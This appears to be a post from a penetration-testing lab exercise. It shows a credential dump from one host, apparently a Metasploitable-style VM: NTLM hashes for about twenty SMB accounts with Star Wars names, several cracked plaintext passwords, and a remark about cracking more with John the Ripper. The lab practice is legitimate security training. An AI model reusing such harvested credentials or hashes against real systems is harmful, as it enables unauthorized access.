10.20.10.23 Â 10.20.10.23 Â 8022/tcp (http) Â admin Â  Â  Â  Â  Â  Â  admin Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Password

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â administrator Â  Â  aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â guest Â  Â  Â  Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â vagrant Â  Â  Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â sshd Â  Â  Â  Â  Â  Â  Â aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â sshd_server Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â leah_organa Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â luke_skywalker Â  Â aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â han_solo Â  Â  Â  Â  Â aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â artoo_detoo Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â c_three_pio Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â ben_kenobi Â  Â  Â  Â aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â darth_vader Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â anakin_skywalker Â aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â jarjar_binks Â  Â  Â aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â lando_calrissian Â aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â boba_fett Â  Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â jabba_hutt Â  Â  Â  Â aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â greedo Â  Â  Â  Â  Â  Â aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â chewbacca Â  Â  Â  Â  aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â 10.20.10.23 Â 445/tcp (smb) Â  Â kylo_ren Â  Â  Â  Â  Â aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001 Â  Â  Â  Â  NTLM hash

10.20.10.23 Â  Â  Â  Â  Â  Â  Â  445/tcp (smb) Â  Â c_three_pio Â  Â  Â  pr0t0c0l:12 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Password

10.20.10.23 Â  Â  Â  Â  Â  Â  Â  445/tcp (smb) Â  Â vagrant Â  Â  Â  Â  Â  vagrant:5 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Password

10.20.10.23 Â  Â  Â  Â  Â  Â  Â  445/tcp (smb) Â  Â administrator Â  Â  vagrant:3 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Password

**10.20.10.23 Â 10.20.10.23 Â 8282/tcp (http) Â sploit Â  Â  Â  Â  Â  Â sploit Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Password**

BTW, I manged to crack a couple of more passwords, I'll show later. I really want to keep playing with JtR to get them all.